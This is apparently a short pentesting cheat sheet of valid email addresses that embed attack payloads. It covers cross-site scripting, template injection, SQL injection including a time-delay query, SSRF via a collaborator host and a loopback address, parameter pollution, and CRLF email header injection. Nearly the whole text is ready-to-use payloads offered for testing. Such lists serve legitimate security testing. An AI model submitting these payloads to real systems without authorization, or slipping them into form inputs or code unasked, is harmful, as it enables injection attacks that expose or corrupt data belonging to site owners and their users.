**The following payloads are all valid e-mail addresses that we can use for pentesting of not only web based e-mail systems.**

**XSS (Cross-Site Scripting)**
```
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
```
**Template Injection**
```
"<%= 7 * 7 %>"@example.com
test+(${{7*7}})@example.com
```
**SQL Injection**
```
"' OR 1=1 -- '"@example.com
"mail');SELECT SLEEP(10);--"@example.com
```
**SSRF (Server-Side Request Forgery)**
```
john.doe@abc123.burpcollaborator.net
john.doe@[127.0.0.1]
```
**Parameter Pollution**
```
victim&email=attacker@example.com
```
**(Email) Header Injection**
```
"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example.com
"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
```
